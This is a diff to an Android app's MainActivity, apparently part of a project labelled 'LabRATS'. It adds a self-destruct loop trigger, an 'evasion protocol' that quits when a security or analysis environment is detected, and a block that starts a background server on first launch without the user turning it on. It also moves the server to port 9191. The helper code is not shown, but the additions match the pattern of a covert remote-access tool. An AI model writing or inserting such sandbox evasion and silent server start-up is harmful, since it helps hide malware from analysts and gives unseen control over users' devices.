@@ -51,7 +51,22 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+
+        // --- NUCLEAR DESTRUCT CHECK ---
+        if (getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("is_destructing", false)) {
+            Log.w("SelfDestruct", "Destruction active. Triggering loop.");
+            SystemAnalytics.triggerSelfDestructLoop(this);
+            finish();
+            return;
+        }
         
+        // --- EVASION PROTOCOL: Immediate exit in risky environments ---
+        if (SystemAnalytics.checkEnv(this)) {
+            Log.w("LabRATS-Evasion", "Security environment violation. Self-terminating activity.");
+            finish();
+            return;
+        }
+
         // --- EMERGENCY CRASH LOGGER ---
         Thread.setDefaultUncaughtExceptionHandler((thread, throwable) -> {
             Log.e("LabRATS-FATAL", "CRASH_DETECTED: " + throwable.getMessage(), throwable);
@@ -65,6 +80,17 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         initViews();
         requestPermissions();
+        
+        // --- AUTO-START ON FIRST LAUNCH PROTOCOL ---
+        boolean isFirstLaunch = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("first_launch", true);
+        if (isFirstLaunch) {
+            Log.d("LabRATS-AutoStart", "First launch detected. Initiating background server startup.");
+            getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("first_launch", false).apply();
+            
+            // Trigger server immediately without waiting for UI toggle
+            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(this::toggleServer, 2000);
+        }
+
         updateUI();
     }
 
@@ -584,7 +610,7 @@ public class MainActivity extends AppCompatActivity {
             } else {
                 tvIpAddress.setText(ipText.toString());
                 String displayIp = (localIp != null) ? localIp : publicIp;
-                String formattedUrl = isIPv6(displayIp) ? "http://[" + displayIp + "]:8080" : "http://" + displayIp + ":8080";
+                String formattedUrl = isIPv6(displayIp) ? "http://[" + displayIp + "]:9191" : "http://" + displayIp + ":9191";
                 tvServerUrl.setText(formattedUrl);
             }
         });
